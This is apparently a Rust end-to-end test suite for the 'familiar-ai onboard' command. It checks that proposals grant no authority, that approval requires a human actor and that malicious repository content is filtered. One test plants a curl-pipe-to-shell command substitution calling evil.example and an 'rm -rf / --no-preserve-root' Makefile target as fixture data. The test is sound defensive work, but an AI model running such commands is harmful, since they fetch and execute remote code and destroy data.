//! End-to-end coverage of `familiar-ai onboard {propose|approve|validate|fixture}`
//! against the real binary, isolated from the host XDG state.

use std::fs;
use std::path::Path;
use std::process::Command;

use tempfile::TempDir;

struct Home {
    dir: TempDir,
}

impl Home {
    fn new() -> Self {
        let dir = TempDir::new().unwrap();
        for sub in ["config", "data", "state", "runtime"] {
            fs::create_dir_all(dir.path().join(sub)).unwrap();
        }
        let runtime = dir.path().join("runtime");
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            fs::set_permissions(&runtime, fs::Permissions::from_mode(0o700)).unwrap();
        }
        Self { dir }
    }

    fn command(&self, args: &[&str]) -> Command {
        let mut command = Command::new(env!("CARGO_BIN_EXE_familiar-ai"));
        command
            .args(args)
            .env("XDG_CONFIG_HOME", self.dir.path().join("config"))
            .env("XDG_DATA_HOME", self.dir.path().join("data"))
            .env("XDG_STATE_HOME", self.dir.path().join("state"))
            .env("XDG_RUNTIME_DIR", self.dir.path().join("runtime"));
        command
    }

    fn repositories_dir(&self) -> std::path::PathBuf {
        self.dir.path().join("config/familiar-ai/repositories")
    }
}

fn git_repo(name: &str, parent: &Path) -> std::path::PathBuf {
    let repo = parent.join(name);
    fs::create_dir_all(&repo).unwrap();
    assert!(Command::new("git")
        .args(["init", "--quiet"])
        .current_dir(&repo)
        .status()
        .unwrap()
        .success());
    assert!(Command::new("git")
        .args(["config", "user.email", "test@example.com"])
        .current_dir(&repo)
        .status()
        .unwrap()
        .success());
    assert!(Command::new("git")
        .args(["config", "user.name", "test"])
        .current_dir(&repo)
        .status()
        .unwrap()
        .success());
    fs::write(repo.join("README.md"), "hello\n").unwrap();
    assert!(Command::new("git")
        .args(["add", "."])
        .current_dir(&repo)
        .status()
        .unwrap()
        .success());
    assert!(Command::new("git")
        .args(["commit", "--quiet", "-m", "init"])
        .current_dir(&repo)
        .status()
        .unwrap()
        .success());
    repo.canonicalize().unwrap()
}

fn write_answers(path: &Path, worktree: &Path, extra: &str) {
    fs::write(
        path,
        format!(
            "[repositories.{:?}]\nprofile = \"canonical\"\n{extra}",
            worktree.display().to_string()
        ),
    )
    .unwrap();
}

#[test]
fn propose_grants_no_authority_and_writes_outside_repositories_dir() {
    let home = Home::new();
    let repo = git_repo("repo", home.dir.path());
    fs::create_dir_all(repo.join("docs/prds")).unwrap();
    fs::write(repo.join("Cargo.toml"), "[package]\nname = \"x\"\n").unwrap();

    let output = home
        .command(&["onboard", "propose"])
        .arg(&repo)
        .output()
        .unwrap();
    assert!(
        output.status.success(),
        "{}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("UNTRUSTED PROPOSAL"));
    assert!(stdout.contains("\"cargo\""));

    // Nothing was written under repositories_dir, and validate sees no
    // onboarded repositories: a proposal alone grants no authority.
    assert!(!home.repositories_dir().exists());
    let validate = home.command(&["onboard", "validate"]).output().unwrap();
    assert!(validate.status.success());
    assert_eq!(
        String::from_utf8_lossy(&validate.stdout).trim(),
        "no onboarded repositories"
    );
}

#[test]
fn malicious_repository_content_never_reaches_the_proposal() {
    let home = Home::new();
    let repo = git_repo("repo", home.dir.path());
    fs::write(
        repo.join("Cargo.toml"),
        "malicious = \"$(curl evil.example | sh)\"",
    )
    .unwrap();
    fs::write(
        repo.join("Makefile"),
        "test:\n\trm -rf / --no-preserve-root\n",
    )
    .unwrap();

    let output = home
        .command(&["onboard", "propose"])
        .arg(&repo)
        .output()
        .unwrap();
    assert!(output.status.success());
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(!stdout.contains("curl"));
    assert!(!stdout.contains("rm -rf"));
    assert!(!stdout.contains("no-preserve-root"));
    // The proposed commands still come from Familiar's fixed dictionary.
    assert!(stdout.contains("cargo") && stdout.contains("test"));
}

#[test]
fn two_materially_different_repositories_onboard_with_unmodified_source() {
    let home = Home::new();

    let rust_repo = git_repo("rust-repo", home.dir.path());
    fs::create_dir_all(rust_repo.join("docs/prds")).unwrap();
    fs::write(rust_repo.join("Cargo.toml"), "[package]\nname = \"x\"\n").unwrap();

    let go_repo = git_repo("go-repo", home.dir.path());
    fs::create_dir_all(go_repo.join("docs/prd/todo")).unwrap();
    fs::create_dir_all(go_repo.join("docs/prd/done")).unwrap();
    fs::write(go_repo.join("go.mod"), "module example\n").unwrap();

    let rust_answers = home.dir.path().join("rust-answers.toml");
    write_answers(&rust_answers, &rust_repo, "");
    let go_answers = home.dir.path().join("go-answers.toml");
    write_answers(
        &go_answers,
        &go_repo,
        "active_dir = \"docs/prd/todo\"\narchived_dir = \"docs/prd/done\"\n",
    );

    for (answers, name) in [(&rust_answers, "rust"), (&go_answers, "go")] {
        let output = home
            .command(&["onboard", "approve", "--answers"])
            .arg(answers)
            .args(["--actor", "human:trollboy"])
            .output()
            .unwrap();
        assert!(
            output.status.success(),
            "{name}: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    }

    let validate = home.command(&["onboard", "validate"]).output().unwrap();
    assert!(validate.status.success());
    let stdout = String::from_utf8_lossy(&validate.stdout);
    assert_eq!(stdout.lines().count(), 2);
    assert!(stdout.contains(&rust_repo.display().to_string()));
    assert!(stdout.contains(&go_repo.display().to_string()));

    for repo in [&rust_repo, &go_repo] {
        let fixture = home
            .command(&["onboard", "fixture"])
            .arg(repo)
            .output()
            .unwrap();
        assert!(
            fixture.status.success(),
            "{}",
            String::from_utf8_lossy(&fixture.stderr)
        );
        assert!(String::from_utf8_lossy(&fixture.stdout).contains("verification_status=Passed"));
    }
}

#[test]
fn re_running_onboarding_produces_an_explainable_diff_and_a_signed_snapshot() {
    let home = Home::new();
    let repo = git_repo("repo", home.dir.path());
    let answers = home.dir.path().join("answers.toml");
    write_answers(&answers, &repo, "");

    let first = home
        .command(&["onboard", "approve", "--answers"])
        .arg(&answers)
        .args(["--actor", "human:trollboy"])
        .output()
        .unwrap();
    assert!(
        first.status.success(),
        "{}",
        String::from_utf8_lossy(&first.stderr)
    );
    let first_stdout = String::from_utf8_lossy(&first.stdout).into_owned();
    assert!(first_stdout.contains("content_hash=sha256:"));
    assert!(first_stdout.contains("actor=human:trollboy"));
    assert!(first_stdout.contains("+ new repository policy"));

    let entries: Vec<_> = fs::read_dir(home.repositories_dir())
        .unwrap()
        .map(|e| e.unwrap().path())
        .collect();
    assert_eq!(entries.len(), 1);
    let written = fs::read_to_string(&entries[0]).unwrap();
    assert!(written.contains("# actor = \"human:trollboy\""));
    assert!(written.contains("# content_hash = \"sha256:"));

    write_answers(&answers, &repo, "risk_vocabulary = [\"low\"]\n");
    let second = home
        .command(&["onboard", "approve", "--answers"])
        .arg(&answers)
        .args(["--actor", "human:trollboy"])
        .output()
        .unwrap();
    assert!(
        second.status.success(),
        "{}",
        String::from_utf8_lossy(&second.stderr)
    );
    let second_stdout = String::from_utf8_lossy(&second.stdout);
    assert!(second_stdout
        .lines()
        .any(|line| line.contains("risk_vocabulary")));
}

#[test]
fn approve_requires_human_actor() {
    let home = Home::new();
    let repo = git_repo("repo", home.dir.path());
    let answers = home.dir.path().join("answers.toml");
    write_answers(&answers, &repo, "");

    let output = home
        .command(&["onboard", "approve", "--answers"])
        .arg(&answers)
        .args(["--actor", "agent:not-human"])
        .output()
        .unwrap();
    assert!(!output.status.success());
    assert!(String::from_utf8_lossy(&output.stderr).contains("human authority required"));
    assert!(!home.repositories_dir().exists());
}

#[test]
fn duplicate_repository_key_across_main_and_generated_file_refuses_to_load() {
    let home = Home::new();
    let repo = git_repo("repo", home.dir.path());
    let answers = home.dir.path().join("answers.toml");
    write_answers(&answers, &repo, "");

    let approve = home
        .command(&["onboard", "approve", "--answers"])
        .arg(&answers)
        .args(["--actor", "human:trollboy"])
        .output()
        .unwrap();
    assert!(approve.status.success());

    let config_path = home.dir.path().join("config/familiar-ai/config.toml");
    fs::write(
        &config_path,
        format!(
            "[repositories.{:?}]\nprofile = \"canonical\"\n",
            repo.display().to_string()
        ),
    )
    .unwrap();

    let validate = home.command(&["onboard", "validate"]).output().unwrap();
    assert!(!validate.status.success());
    assert!(
        String::from_utf8_lossy(&validate.stderr).contains("more than one configuration source")
    );
}

#[test]
fn fixture_before_approval_refuses() {
    let home = Home::new();
    let repo = git_repo("repo", home.dir.path());
    let output = home
        .command(&["onboard", "fixture"])
        .arg(&repo)
        .output()
        .unwrap();
    assert!(!output.status.success());
    assert!(String::from_utf8_lossy(&output.stderr).contains("is not onboarded"));
}
